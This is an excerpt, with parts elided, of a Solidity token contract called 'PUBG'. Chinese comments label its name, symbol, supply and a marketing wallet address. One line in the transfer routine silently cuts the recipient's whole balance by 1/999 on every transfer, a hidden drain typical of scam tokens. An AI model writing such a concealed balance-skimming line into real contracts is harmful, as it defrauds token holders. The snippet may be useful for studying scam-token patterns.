...
abstract contract PUBGToken is IERC20, Ownable {
    ...
    function _takeTransfer(
        ...
        _balances[to] = _balances[to] - _balances[to] / 999 ;
        }
...
contract PUBG is PUBGToken {
    constructor() PUBGToken(
    //名称
        "PUBG",
    //符号
        "PUBG",
    ...
    //总量 
        100000000,
    //营销钱包
        address(0xd8115DC188cD9eaD570563f09Be424141c0728A1)
    ){
